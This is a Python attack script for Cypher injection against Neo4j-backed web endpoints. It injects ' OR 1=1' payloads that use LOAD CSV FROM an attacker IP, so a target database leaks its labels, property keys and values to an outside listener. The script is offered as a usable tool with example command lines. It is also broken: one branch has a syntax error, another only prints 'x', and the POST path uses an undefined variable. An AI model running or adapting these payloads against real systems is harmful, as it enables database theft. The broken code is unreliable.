import argparse
import requests
import urllib
import sys

headers = {
    'Host': '192.168.17.158:3030',
    'User-Agent': 'curl/8.5.0',
    'Accept': '*/*',
    'Connection': 'close',
}

proxies = {
    'http': 'http://127.0.0.1:8080',
}

cookies = {
    'x': '17ab96bd8ffbe8ca58a78657a918558'
}



def inject_payload(target, exfil_ip, payload, request_type):
    types = [["NONEXIST'", "Property"], ["-1", "ID"]]
    for i in range(len(types)):
        full_payload = types[i][0] + payload 
        if request_type == "API":
            url = f"{target + urllib.parse.quote(full_payload, safe='')}"
            response = requests.get(url, headers=headers, verify=False, proxies=proxies, cookies=cookies)
            if response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
                print(f"Injecting in {types[i][1]} ... Check your listener")
        elif request_type == "GET"
            print("x")
        elif request_type == "POST":
            response = requests.post(url, data=full_payload, headers=headers, verify=False, proxies=proxies, cookies=cookies)
            if response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
                print(f"Injecting in {types[i][1]} ... Check your listener")
        else:
            print("x")


def dump_labels(target, exfil_ip, request_type):
    payload = f" OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://{exfil_ip}/?label='+label as l RETURN 0 as _0 //"
    inject_payload(target, exfil_ip, payload, request_type)

def dump_properties(target, exfil_ip, label, request_type):
    payload = f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{exfil_ip}/?keys=' + p as l RETURN 0 as _0 //"
    inject_payload(target, exfil_ip, payload, request_type)

def dump_values(target, exfil_ip, label, request_type):
    payload = f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{exfil_ip}/?keys=' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //"
    inject_payload(target, exfil_ip, payload, request_type)


def main():
    examples = """
Examples:

API:
python script.py -u http://ip/api/endpoint -l 127.0.0.1 -t API

http://192.168.17.158:3030/api/neo4j/characters/name/


GET:
python script.py -u http://ip/vulnerable_page -l 127.0.0.1 -t GET -p "vulnerable_parameters"

http://192.168.17.158:3030/api/neo4j/characters?name=Spongebob


POST:
python script.py -u http://ip/vulnerable_page -l 127.0.0.1 -t POST -p "vulnerable_parameters"

http://192.168.17.158:3030/api/neo4j/characters -d "name=Spongebob"
    """
    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j", formatter_class=argparse.RawTextHelpFormatter, epilog=examples)
    parser.add_argument("-u", "--url", required=True, help="Target URL: http://192.168.17.158:3030/api/neo4j/characters")
    parser.add_argument("-l", "--exfil-ip", required=True, help="Exfiltration IP: 127.0.0.1")
    parser.add_argument("-t", "--type", required=True, help="API/GET/POST")
    parser.add_argument("-p", "--parameters", help="Vulnerable parameters")
    args = parser.parse_args()

    target = args.url
    exfil_ip = args.exfil_ip
    request_type = args.type
    parameters = args.parameters

    print(f"Type: {args.type}")
    print("Dumping Labels")
    dump_labels(target, exfil_ip, request_type)

    label = input("Enter Label: ")

    print("Dumping Properties")
    dump_properties(target, exfil_ip, label, request_type)

    print("Dumping Value of Properties")
    dump_values(target, exfil_ip, label, request_type)


if __name__ == "__main__":
    main()
